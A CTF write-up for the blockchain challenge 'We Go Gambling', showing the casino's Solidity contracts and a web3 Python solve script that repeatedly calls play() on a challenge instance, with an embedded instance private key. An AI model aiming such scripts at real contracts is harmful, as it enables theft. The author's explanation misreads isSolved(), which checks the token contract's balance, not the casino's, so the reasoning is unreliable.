---
layout: post
title:  "We Go Gambling"
date:   2025-12-07 16:41:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /nullCTF-we-go-gambling/
---

**Title**: We Go Gambling

**Category**: Blockchain

**Author**: xseven

**Description**: Welcome to the Lucky Crypto Casino! The premier destination for high-stakes gambling on the blockchain. Step right up, ladies and gentlemen, to the only place in the metaverse where fortune favors the bold! [http://public.ctf.r0devnull.team:3011](http://public.ctf.r0devnull.team:3011) 

I get the challenge files `Setup.sol`, `Coin.sol`, and `Casino.sol`:
```shell
cat Setup.sol  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;  
  
import "./Coin.sol";  
import "./Casino.sol";  
  
contract Setup {  
   LuckToken public token;  
   Casino public casino;  
  
   constructor() payable {  
       require(msg.value == 100 ether, "Setup requires 100 Ether");  
  
       token = new LuckToken();  
       casino = new Casino(address(token));  
  
       uint256 luckSupply = address(this).balance / 100;  
  
       token.mint(address(this), luckSupply);  
       token.transferOwnership(address(casino));  
       token.transfer(address(casino), luckSupply);  
          
       payable(address(casino)).transfer(address(this).balance);  
   }  
  
   function isSolved() external view returns (bool) {  
       return address(token).balance < 1 ether;  
   }  
}
_______________________________________________________________________________________________________________________

cat Coin.sol  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;  
  
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";  
import "@openzeppelin/contracts/access/Ownable.sol";  
  
contract LuckToken is ERC20, Ownable {  
   constructor() ERC20("LuckToken", "LUCK") Ownable(msg.sender) {}  
  
   function mint(address to, uint256 amount) public onlyOwner {  
       _mint(to, amount);  
   }  
}
_______________________________________________________________________________________________________________________

cat Casino.sol  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;  
  
import "./Coin.sol";  
import "@openzeppelin/contracts/utils/Address.sol";  
  
contract Casino {  
   LuckToken public token;  
   uint256 public constant RATE = 100;  
  
   event Won(address indexed player, uint256 amount);  
   event Lost(address indexed player, uint256 amount);  
  
   constructor(address _tokenAddress) {  
       token = LuckToken(_tokenAddress);  
   }  
  
   receive() external payable {}  
  
   function buyLuck() public payable {  
       require(msg.value >= RATE, "Send at least 100 wei");  
       uint256 luckAmount = msg.value / RATE;  
          
       require(token.balanceOf(address(this)) >= luckAmount, "Casino has insufficient LUCK");  
       token.transfer(msg.sender, luckAmount);  
   }  
  
   function sellLuck(uint256 amount) public {  
       require(amount > 0, "Amount must be greater than 0");  
       require(token.balanceOf(msg.sender) >= amount, "Insufficient balance");  
          
       uint256 ethAmount = amount * RATE;  
       require(address(this).balance >= ethAmount, "Casino has insufficient ETH liquidity");  
  
       token.transferFrom(msg.sender, address(this), amount);  
  
       payable(msg.sender).transfer(ethAmount);  
   }  
  
   function play(uint256 betAmount) public {  
       require(msg.sender.code.length == 0, "Contracts are not allowed to play");  
       require(token.balanceOf(msg.sender) >= betAmount, "Insufficient LUCK tokens");  
       require(token.allowance(msg.sender, address(this)) >= betAmount, "Please approve tokens first");  
  
       token.transferFrom(msg.sender, address(this), betAmount);  
  
       uint256 random = uint256(keccak256(abi.encodePacked(  
           block.timestamp,    
           block.prevrandao,    
           msg.sender  
       ))) % 100;  
  
       if (random < 25) {  
           uint256 prize = betAmount * 4;  
           require(token.balanceOf(address(this)) >= prize, "Casino cannot afford payout");  
           token.transfer(msg.sender, prize);  
           emit Won(msg.sender, prize);  
       } else {  
           emit Lost(msg.sender, betAmount);  
       }  
   }  
}
```

I go to `http://public.ctf.r0devnull.team:3011/` and start my instance. I run this just to check my balance:
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://public.ctf.r0devnull.team:3011/69cb22d9-6793-465e-bd9b-d6d5b9489723"))
WALLET_ADDR = "0x8886A9b40720A6074F0aEdbf5deEFED861c9Ffac"

print("Connected:", w3.is_connected())

balance = w3.eth.get_balance(WALLET_ADDR)

print("Balance (wei):", balance)
print("Balance (ether):", w3.from_wei(balance, "ether"))
```

Output:
```shell
python3 check-wallet.py  
Connected: True  
Balance (wei): 2000000000000000000  
Balance (ether): 2
```

The challenge is solved when the casino has less than 1 ether (it begins with 100):
```shell
function isSolved() external view returns (bool) {  
    return address(token).balance < 1 ether;  
}  
```

The win chance is 25%. A win returns 4x your bet. 

Run this solve script:
```python
from web3 import Web3
from eth_account import Account
import json

RPC_URL = "http://public.ctf.r0devnull.team:3011/69cb22d9-6793-465e-bd9b-d6d5b9489723"
PRIVKEY = "8d87e273f3bb3e9bc1cbb646c4a662a0e7a20d1d3d33888877aa5e0705eeea42"
SETUP_ADDR = "0x97F569909e4c53c8521F41272BA9167e67FAbD69"
WALLET_ADDR = "0x8886A9b40720A6074F0aEdbf5deEFED861c9Ffac"

Setup_ABI = [
    {
        "inputs": [],
        "name": "casino",
        "outputs": [{"internalType": "contract Casino", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "token",
        "outputs": [{"internalType": "contract LuckToken", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

Casino_ABI = [
    {
        "inputs": [{"internalType": "uint256", "name": "betAmount", "type": "uint256"}],
        "name": "play",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "buyLuck",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function",
    },
]

Token_ABI = [
    {
        "inputs": [
            {"internalType": "address", "name": "spender", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
        ],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
]

w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "RPC NOT CONNECTED"

acct = Account.from_key(PRIVKEY)
assert acct.address.lower() == WALLET_ADDR.lower()

print("Connected to blockchain")
print("Wallet ETH:", w3.from_wei(w3.eth.get_balance(WALLET_ADDR), "ether"))

setup = w3.eth.contract(address=SETUP_ADDR, abi=Setup_ABI)
CASINO_ADDR = setup.functions.casino().call()
TOKEN_ADDR = setup.functions.token().call()

casino = w3.eth.contract(address=CASINO_ADDR, abi=Casino_ABI)
token = w3.eth.contract(address=TOKEN_ADDR, abi=Token_ABI)

print("Casino addr:", CASINO_ADDR)
print("Token addr:", TOKEN_ADDR)

def send(tx):
    tx.update({"nonce": w3.eth.get_transaction_count(WALLET_ADDR)})
    signed = w3.eth.account.sign_transaction(tx, PRIVKEY)
    return w3.eth.send_raw_transaction(signed.raw_transaction)

print("Buying 100 wei of LUCK")
tx_hash = send(casino.functions.buyLuck().build_transaction({
    "from": WALLET_ADDR,
    "value": 100
}))
w3.eth.wait_for_transaction_receipt(tx_hash)

balance = token.functions.balanceOf(WALLET_ADDR).call()
print(f"Approving casino to spend {balance} LUCK")

tx_hash = send(token.functions.approve(CASINO_ADDR, balance).build_transaction({
    "from": WALLET_ADDR
}))
w3.eth.wait_for_transaction_receipt(tx_hash)

print("Starting auto-play loop...")

while True:
    tx_hash = send(casino.functions.play(1).build_transaction({
        "from": WALLET_ADDR
    }))
    w3.eth.wait_for_transaction_receipt(tx_hash)

    solved = setup.functions.isSolved().call()
    if solved:
        print("\nSolved!\n")
        break
```

Output:
```shell
python3 solve3.py  
Connected to blockchain  
Wallet ETH: 2  
Casino addr: 0x92F80f892987d08A43Ca55F5ACD7511Fd9cC22de  
Token addr: 0x9A073ecb54E9311d5247A46afd829f0445AfB2be  
Buying 100 wei of LUCK  
Approving casino to spend 1 LUCK  
Starting auto-play loop...  
  
Solved!

```
Go to `http://public.ctf.r0devnull.team:3011/` and get the flag!

`nullctf{w!nn!ng_is_s0_much_fun!!}`